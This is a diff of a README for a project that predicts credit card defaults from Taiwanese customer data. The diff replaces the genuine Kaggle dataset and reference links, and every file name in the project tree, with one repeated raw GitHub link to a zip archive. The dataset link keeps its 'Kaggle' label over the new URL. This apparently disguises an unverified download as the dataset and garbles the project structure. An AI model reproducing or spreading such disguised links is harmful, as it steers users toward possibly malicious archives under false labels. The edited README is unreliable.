@@ -23,7 +23,7 @@ A credit card company in Taiwan is aiming to better understand the default behav
 ## 📂 Dataset
 The dataset includes information on default payments, demographic characteristics, credit histories, and bill statements for credit card users in Taiwan between April 2005 and September 2005. It contains 30,000 records and 25 features, covering factors like payment history, credit usage, and personal attributes.
 
-For further details, visit the [Kaggle dataset link](https://www.kaggle.com/code/selener/prediction-of-credit-card-default/input).
+For further details, visit the [Kaggle dataset link](https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip).
 
 ---
 
@@ -58,34 +58,34 @@ For further details, visit the [Kaggle dataset link](https://www.kaggle.com/code
 
 ## 📂 Project Structure
 
-├── README.md
+├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
 ├── dataset/
-│ └── credit_card_default.csv
+│ └── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
 ├── problem-statement/
 ├── data-analysis/
-│ ├── exploratory-data-analysis.ipynb
-│ ├── univariate-analysis.png
-│ └── bivariate-analysis.png
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ └── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
 ├── data-cleaning/
-│ ├── missing-values-treatment.ipynb
-│ ├── outlier-detection.ipynb
-│ └── duplicated-values.ipynb
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ └── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
 ├── feature-engineering/
-│ ├── encoding.ipynb
-│ ├── feature-selection.ipynb
-│ └── smote.ipynb
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ └── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
 ├── model-building/
-│ ├── train-test-split.ipynb
-│ ├── scaling.ipynb
-│ └── model-training.ipynb
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ └── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
 ├── model-implementation/
-│ ├── logistic-regression.ipynb
-│ ├── knn.ipynb
-│ ├── random-forest.ipynb
-│ └── lightgbm.ipynb
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ └── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
 ├── model-results/
-│ ├── performance-metrics.ipynb
-│ └── model-explainability.ipynb
+│ ├── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
+│ └── https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip
 └── references/
 
 ---
@@ -108,7 +108,7 @@ This project demonstrates the power of data analytics and machine learning in re
 ---
 
 ## 📚 References
-- Kaggle Dataset: [Prediction of Credit Card Default](https://www.kaggle.com/code/selener/prediction-of-credit-card-default/input)
+- Kaggle Dataset: [Prediction of Credit Card Default](https://raw.githubusercontent.com/KotadiyaJaydeep/Credit-Frud-Dectations/main/exuberate/Dectations_Credit_Frud_3.5.zip)
 - SMOTE Algorithm Documentation
 - Scikit-learn API Reference
 
